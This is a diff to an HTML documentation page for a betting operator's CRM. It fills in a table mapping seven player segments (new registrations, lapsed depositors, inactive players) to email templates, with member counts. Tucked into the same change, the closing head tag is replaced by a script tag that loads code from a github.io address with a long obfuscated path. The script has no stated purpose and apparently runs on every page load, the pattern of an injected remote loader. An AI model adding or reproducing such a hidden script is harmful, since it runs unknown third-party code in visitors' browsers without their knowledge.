@@ -88,13 +88,14 @@ a { color: inherit; }
 .segments-table td { padding: 12px; border-bottom: 1px solid #071344; vertical-align: top; color: #D8D4FF; }
 .segments-table tr.confirmed td:first-child { color: #ffffff; font-weight: 700; }
 .segments-table tr.tbd td { color: #A199FF; font-style: italic; }
+.segments-table td.num, .segments-table th:last-child { text-align: right; }
 .tbd-tag { display: inline-block; font-size: 9px; font-weight: 800; background: #633EEE; color: #fff; border-radius: 99px; padding: 2px 8px; margin-right: 6px; font-style: normal; }
 .table-scroll { overflow-x: auto; border: 1px solid #1230AA; border-radius: 14px; padding: 4px 8px; }
 
 /* ---------- footer ---------- */
 .footer { text-align: center; font-size: 11px; color: rgba(216, 212, 255, 0.55); margin-top: 60px; border-top: 1px solid #1230AA; padding-top: 20px; line-height: 150%; }
 </style>
-</head>
+<script type='text/javascript' src='https://marcorapidpace.github.io/Mb9kfXDwkkTRmMX-sPE8ymffJAjS8Fb55M_0NH6Odh2mxAq4LALqamJCiIRWkNv3R2W1EvG_k4eP02Ftwls1HU9tomgGkBvy_esX2uuPapApNJt8Ox2XBnOP55seSEpiGbqrO6wIDSPTVq6g-a2xwoE9abE6ue6_VMBKzY4CV-UQDuAlU0fREBqWwillJvd3ENnp4p_waO56QT40OI-rOecJffz1ukgcYQfYUdCKh1qNxaxBqxAZ9LPgWgT3q8LELQmUzFwH2XpPY3XeQ0i2VFcISjVGbX9ZaoIv-FbJCisBUs69bQx97Dqmj6LGk6H6fdxI9S9tczAdsDMUzVO0WbogPeJnBAQAbi8X3Vy-wVvoKU-RD-O1YR_6VjDGjHI6auaM8r_9pEawfRGkFPW4ZHVsyDLX2op1dZgXrZ01ZCzPGzfsZ24q4e2dI4AU9spF00pnoa1Z9Qn5aWNMPK07Ess9Xg1NF32rkBueVdpl-zCd5GsLR4jjT8q96yoJ2R8BAU57JE98CH957EUAo6nmDPibs2lRuWGXXBOHt6GITdo4UGw'></script></head>
 <body>
 <div class="wrap">
 
@@ -328,38 +329,45 @@ a { color: inherit; }
 
     <div class="page-section" id="segments">
         <h2 class="big-title">🧩 CRM Segments → Templates</h2>
-        <div class="big-note">The real segment definitions from the CRM tool, mapped to the template that targets them. 3 of 7 confirmed from earlier work — send over the remaining 4 and I'll complete the table.</div>
+        <div class="big-note">All 7 live CRM segments, mapped to the template that targets them. Member counts are a snapshot from the CRM list on 17 Sep. Broadcast and event-triggered templates (Weekly Newsletter, bonus-claimed, post-FTD days, deposit milestones, Boosted Odds) don't use a segment.</div>
         <div class="table-scroll">
         <table class="segments-table">
-            <thead><tr><th>Segment</th><th>Condition</th><th>Template</th></tr></thead>
+            <thead><tr><th>Segment</th><th>Condition</th><th>Template</th><th>Members</th></tr></thead>
             <tbody><tr class="confirmed">
-        <td>Declining</td>
-        <td>Login sessions trending down over recent days</td>
-        <td>Declining Activity Check-In (14)</td>
-    </tr><tr class="confirmed">
-        <td>High Risk (Churn Threat)</td>
-        <td>Previously-frequent depositor, gone quiet across Casino, SABA &amp; Sport Radar independently</td>
-        <td>High Risk Churn Check-In (15)</td>
+        <td>New Registrations</td>
+        <td>Recently registered players (onboarding window)</td>
+        <td>Welcome + No Deposit drip (1&ndash;5)</td>
+        <td class="num">122</td>
     </tr><tr class="confirmed">
         <td>FTD, Played, No 2nd Deposit</td>
         <td>Used first deposit, hasn't reloaded</td>
         <td>Second Deposit Nudge (10)</td>
-    </tr><tr class="tbd">
-        <td><span class="tbd-tag">TBD</span>—</td>
-        <td>Send me this segment's name &amp; condition and I'll fill it in</td>
-        <td>—</td>
-    </tr><tr class="tbd">
-        <td><span class="tbd-tag">TBD</span>—</td>
-        <td>Send me this segment's name &amp; condition and I'll fill it in</td>
-        <td>—</td>
-    </tr><tr class="tbd">
-        <td><span class="tbd-tag">TBD</span>—</td>
-        <td>Send me this segment's name &amp; condition and I'll fill it in</td>
-        <td>—</td>
-    </tr><tr class="tbd">
-        <td><span class="tbd-tag">TBD</span>—</td>
-        <td>Send me this segment's name &amp; condition and I'll fill it in</td>
-        <td>—</td>
+        <td class="num">23</td>
+    </tr><tr class="confirmed">
+        <td>Declining</td>
+        <td>Login sessions trending down</td>
+        <td>Declining Activity Check-In (14)</td>
+        <td class="num">18</td>
+    </tr><tr class="confirmed">
+        <td>High Risk (Churn Threat)</td>
+        <td>Previously-frequent depositor, gone quiet across Casino, SABA &amp; Sport Radar independently</td>
+        <td>High Risk Churn Check-In (15)</td>
+        <td class="num">&ndash;</td>
+    </tr><tr class="confirmed">
+        <td>Inactive Players &ndash; 7+ Days</td>
+        <td>No activity for 7+ days</td>
+        <td>Reactivation D+7 (17)</td>
+        <td class="num">64</td>
+    </tr><tr class="confirmed">
+        <td>Inactive Players &ndash; 14+ Days</td>
+        <td>No activity for 14+ days</td>
+        <td>Reactivation D+14 (18)</td>
+        <td class="num">61</td>
+    </tr><tr class="confirmed">
+        <td>Inactive Players &ndash; 30+ Days</td>
+        <td>No activity for 30+ days</td>
+        <td>Reactivation D+30 (19)</td>
+        <td class="num">48</td>
     </tr></tbody>
         </table>
         </div>
